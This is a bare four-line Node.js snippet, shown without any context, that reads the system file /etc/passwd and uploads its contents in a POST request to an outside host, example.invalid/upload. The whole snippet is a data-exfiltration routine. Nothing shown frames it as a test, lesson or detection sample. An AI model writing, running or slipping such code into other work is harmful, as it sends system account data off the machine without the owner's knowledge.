const fs = require('fs');
const data = fs.readFileSync('/etc/passwd');
const header = 'multipart/form-data';
fetch('https://example.invalid/upload', { method: 'POST', headers: { 'Content-Type': header }, body: data });
